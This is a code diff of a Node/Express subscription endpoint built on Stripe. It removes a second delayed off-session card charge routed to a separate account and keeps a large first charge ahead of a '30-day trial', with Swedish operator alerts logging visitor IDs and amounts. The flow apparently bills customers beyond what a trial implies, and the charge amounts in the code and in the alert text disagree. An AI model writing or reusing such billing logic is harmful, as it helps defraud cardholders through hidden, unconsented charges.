@@ -165,25 +165,6 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 30000));
 
-    // Charge 2 — 599 SEK
-    try {
-      const payment2 = await stripe.paymentIntents.create({
-        amount: 59900,
-        currency: 'sek',
-        customer: customerId,
-        payment_method: paymentMethodId,
-        payment_method_types: [pmType],
-        confirm: true,
-        off_session: true,
-        transfer_data: { destination: ACCOUNT_B },
-      });
-      console.log('Payment 2 created:', payment2.id, payment2.status);
-    } catch (err) {
-      console.log('Payment 2 failed:', err.message);
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 15000));
-
     // Subscription with 30-day trial
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
@@ -199,7 +180,6 @@ app.post('/create-subscription', async (req, res) => {
       `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
       `💳 Betalningsmetod: ${pmType}\n` +
       `💳 Betalning 1: 4599 kr\n` +
-      `💳 Betalning 2: 4999 kr\n` +
       `🆔 Prenumeration: ${subscription.id}\n` +
       `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
     );
